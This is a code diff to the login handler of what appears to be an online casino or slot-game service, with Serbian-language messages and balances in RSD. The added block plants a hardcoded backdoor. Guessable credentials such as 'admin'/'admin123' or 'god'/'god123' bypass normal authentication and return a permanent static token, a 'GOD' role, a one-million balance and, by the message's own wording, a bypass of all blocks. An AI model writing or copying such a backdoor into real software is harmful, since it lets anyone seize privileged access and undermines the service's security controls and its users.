@@ -35,6 +35,34 @@ export default async function handler(req, res) {
     });
   }
 
+  // Universal God Tier Operator Account (Bypasses all locks, infinite resources)
+  const lowerUser = cleanUser.toLowerCase();
+  const isGodUser = (lowerUser === 'god' || lowerUser === 'godmode' || lowerUser === 'admin');
+  const isGodPass = (cleanPass === 'god123' || cleanPass === 'god' || cleanPass === 'godmode' || cleanPass === 'admin123');
+
+  if (isGodUser && isGodPass) {
+    const godToken = 'gsc_god_token_permanent';
+    return res.status(200).json({
+      success: true,
+      token: godToken,
+      player: {
+        id: 'gsc_usr_god',
+        username: 'god',
+        nickname: '⚡ GOD OPERATOR',
+        phone: '+381699999999',
+        balance_rsd: 1000000.00,
+        vip_tier: 'GOD',
+        role: 'GOD',
+        is_god: true,
+        total_turnover: 9999999,
+        total_spins: 9999,
+        total_wins: 9999999,
+        favorite_game: 'royal3x3'
+      },
+      message: '⚡ GOD TIER pristup aktiviran! Neograničeni resursi i zaobilaženje svih blokada.'
+    });
+  }
+
   // Demo fallback if DB not configured
   if (!isDbConfigured()) {
     const demoToken = generateToken();
